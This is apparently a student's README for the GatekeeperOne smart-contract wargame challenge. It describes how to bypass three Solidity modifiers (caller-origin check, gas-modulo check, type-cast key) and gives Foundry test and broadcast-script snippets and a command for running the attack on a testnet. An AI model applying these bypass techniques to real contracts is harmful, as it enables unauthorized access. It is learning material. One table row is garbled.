## 🎯 Objective:
- Objective of this contract is to bypass all the modifier and run the `entrant()` function. 
---
## 📄 Contracts Overview
---
### GateKeeperOne
---
- This contract have 1 state variable 3 modifier and 1 function
	- `entrant`: address public visibility
	- `gateOne()`: modifier
	- `gateTwo()`: modifier
	- `gateThree()`: modifier
	- `enter()`: function
---
## 🧠 Vulnerability: GateKeeperOne
---
- The core vulnerability  of this contract is the given modifier can be bypassed very easily.
```gateOne
//Modifier 1
modifier gateOne(){
	require(msg.sender != tx.origin);
}
```
- This modifier can be bypassed by using a EOA and a Attack Contract to call the function of the GateKeeperOne contract.

```gateTwo
//Modifier 2
modifier gateTwo(){
	require(gasleft() % 8191 == 0);
}
```
- This modifier can be bypassed as it is using common math so it can be brute forced and make the statement true.

```gateThree
//Modifier 3
modifier gateThree(bytes8 _gateKey) { 
	require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),"GatekeeperOne: invalid gateThree part one"); 
	require(uint32(uint64(_gateKey)) != uint64(_gateKey),"GatekeeperOne: invalid gateThree part two"); 
	require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three"); 
	_; 
}
```
- This modifier can be bypassed as it is using a simple type casting mechanics so understanding the requirement this can also be bypassed.

--- 
## Attack Flow:
- To exploit this contract the attacker should know how a modifier works:
```attack
Attacker made a contract which will work as the msg.sender. Inside which all the modifier's counter logic will present, which breaks/by-pass the modifier logic and force the "enter()" function of GatekeeperOne contract to execute.
|
V
for modifier 1:
	The attacker use a contract and a EOA to by pass require(msg.sender != tx.origin)
|
V
for modifier 2:
	the Attacker brute-force the gasleft() value to find compatible value which can by-pass the math{it is done by using for loop}
|
V
for modifioer 3 
	the attacekr type cast tx.origin and 0xFFFFFFFF0000FFFF in systematic-manner 
	bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
	which bypasses the 3 modifier too.
|
V
After the attacker can run the enter() function adn set entrant to tx.origin. 
```
---
## 🧪 Test - TestGateKeeperOne.t.sol
---

| TestName              | What is Checks                                                                                                                   |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| testByPassAllTheGat It checks whether all the logic of attack contract is eligible to break the modifier logic of the GateKeeperOne logic or not.  e  e  |

---
### Key exploit(in test):

```solidity
function testByPassAllTheGates() public {
    //Arrange
    vm.prank(user, user);
    //Act
    attacker.attack(address(gatekeeperone));
    //Assert
    assertEq(gatekeeperone.entrant(), user);
}
```
- The exploit in this file is:
	- `attacker.attack(address(gatekeeperone));` sole responsible to break the logic of the GateKeeperOne.sol modifier logic.

---
## 🚀 On-Chain - AttackGateKeeperOne.s.sol

---
```solidity
function run() public {
    vm.startBroadcast();
    attacker = new AttackGatekeeperOne();
    console.log("Attacker deployed at:", address(attacker));
    attacker.attack(instance);
    vm.stopBroadcast();
}
```
---
## 🛠️ How to Run
---
## Run Tests(Local Anvil)
---
```bash
forge test --mt testByPassAllTheGates -vvvv
```
---
## Deploy & Attack (On-chain)
---
```bash
forge script script/AttackScript.s.sol --rpc-url $SEPOLIA_RPC --private-key $PRIVATE_KEY --broadcast -vvvv
```
---
## 📁 Project Structure
```file
├── src/
│   └──GateKeeperOne.sol
|	└──AttackGateKeeperOne.sol        # call the attack function
├── script/
│   ├── DeployGateKeeperOneScript.s.sol
│   └── AttackScript.s.sol
└── test/
    └── TestGateKeeperOne.t.sol
```
